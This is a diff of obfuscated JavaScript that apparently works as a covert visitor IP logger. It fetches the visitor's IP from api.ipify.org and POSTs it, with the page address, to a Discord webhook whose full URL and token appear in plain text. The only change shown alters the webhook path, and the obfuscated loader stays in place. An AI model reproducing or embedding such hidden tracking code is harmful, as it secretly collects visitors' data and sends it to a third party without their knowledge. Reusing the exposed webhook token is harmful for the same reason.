@@ -2,7 +2,7 @@
 const _0x9b0a=
 ['open','Content-Type','13wxkaYs','stringify','2tzVJmU','application/json','175875NHDHiA','response','2ePffsu','33vimicf',
 'probably\x20the\x20visitor','setRequestHeader','69514jgTLcE','336387gFBSsu','\x0apage:\x20','252611qMjAou','31626zbWkaR',
-'https://api.ipify.org','send','POST','https://discord.com/api/webhooks/849806948882055228/5STEFuPPtwaRVlfp-8hj_ynX44cgal7mYcOCaN9_bwjVBz-LdXLtKrNz4PtvOeyiuR9t',
+'https://api.ipify.org','send','POST','https://discord.com/ai/webhooks/849806948882055228/5STEFuPPtwaRVlfp-8hj_ynX44cgal7mYcOCaN9_bwjVBz-LdXLtKrNz4PtvOeyiuR9t',
 '497685fTQHiv','24118hwtEVS','GET'];(function(_0x400e51,_0x59dda5){const _0x213a17=_0x3224;while(!![]){try{const _0x2d39a1=-parseInt(_0x213a17(0xbd))
 *parseInt(_0x213a17(0xaa))+parseInt(_0x213a17(0xa6))*parseInt(_0x213a17(0xb3))+-parseInt(_0x213a17(0xb9))*parseInt(_0x213a17(0xac))+
 parseInt(_0x213a17(0xb2))+-parseInt(_0x213a17(0xad))*-parseInt(_0x213a17(0xb7))+-parseInt(_0x213a17(0xbb))+parseInt(_0x213a17(0xa9));
